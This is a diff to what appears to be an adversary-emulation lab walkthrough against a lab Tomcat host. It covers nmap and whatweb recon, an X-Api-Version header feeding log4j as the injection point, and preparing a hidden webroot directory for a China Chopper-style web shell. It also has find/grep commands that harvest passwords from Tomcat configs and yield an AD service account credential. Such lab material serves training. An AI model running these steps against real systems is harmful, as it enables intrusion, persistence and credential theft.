@@ -154,7 +154,7 @@ nmap -sV -sC -p 8080 10.0.0.100 -oA /opt/loot/recon/web01_scan
 **Expected output:**
 ```
 PORT     STATE SERVICE VERSION
-8080/tcp open  http    Apache Tomcat (Spring Boot embedded)
+8080/tcp open  http    Apache Tomcat 9.0.54
 ```
 
 > The app suppresses the `Server:` response header. nmap confirms the port is open and HTTP — that is enough.
@@ -165,14 +165,15 @@ PORT     STATE SERVICE VERSION
 whatweb http://10.0.0.100:8080 -v 2>/dev/null | tee /opt/loot/recon/whatweb.txt
 ```
 
-**Expected — Spring Boot REST API, no HTML:**
+**Expected — JSON API, no HTML:**
 ```
 Status    : 400 Bad Request
 Content-Type: application/json
 ```
 
 WhatWeb detects little: no HTML, no Server header, no cookies. The `application/json`
-content type and bare 400 on `/` are characteristic of a Spring Boot REST API with no default endpoint.
+content type and bare 400 on `/` (missing `X-Api-Version` header) reveals a custom JSP API — not a
+static site.
 
 ```bash
 [KALI]
@@ -188,14 +189,14 @@ Content-Type: application/json
 ```bash
 [KALI]
 # Probe for injection vectors: test the X-Api-Version header
-# Spring Boot REST APIs commonly accept custom version headers; log4j logs them at request time
+# The JSP reads this header and passes it directly to log4j — the injection point
 curl -v -H "X-Api-Version: recon-test" http://10.0.0.100:8080/ 2>&1 | grep -E "< HTTP|Content-Type"
 ```
 
 **Expected:**
 ```
-< HTTP/1.1 200
-< Content-Type: text/plain;charset=UTF-8
+< HTTP/1.1 200 
+< Content-Type: application/json;charset=UTF-8
 ```
 
 A 200 confirms the app accepts and processes `X-Api-Version`. This is the header log4j logs.
@@ -378,7 +379,7 @@ The China Chopper one-liner pattern is extensively documented in APT41 intrusion
 [WEB01]
 # Confirm the webroot exists and is writable
 ls /opt/tomcat/webapps/ROOT/
-# WEB-INF/  static/  ...
+# META-INF/  WEB-INF/  index.jsp
 
 # Create a plausible-looking directory path
 mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs
@@ -605,13 +606,12 @@ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 ```bash
 [WEB01]
-# Also check Spring Boot application properties (may have the same creds)
-find / -name "application*.yml" -o -name "application*.properties" 2>/dev/null | \
-  grep -v proc | xargs grep -il "password\|ldap\|username" 2>/dev/null
+# Check Tomcat config for credentials
+find / -name "context.xml" -o -name "tomcat-users.xml" 2>/dev/null | grep -v proc | \
+  xargs grep -i "password\|username\|connectionPassword" 2>/dev/null
 
-# Check Tomcat context.xml if present
-find / -name "context.xml" 2>/dev/null | grep -v proc | \
-  xargs grep -i "password\|connectionPassword" 2>/dev/null
+# Check web.xml for env-entry / resource-ref credentials
+grep -i "password\|credential" /opt/tomcat/webapps/ROOT/WEB-INF/web.xml 2>/dev/null
 ```
 
 **CRITICAL FIND:** `svc_ldap / NovaTech2021!` — valid Active Directory service account.
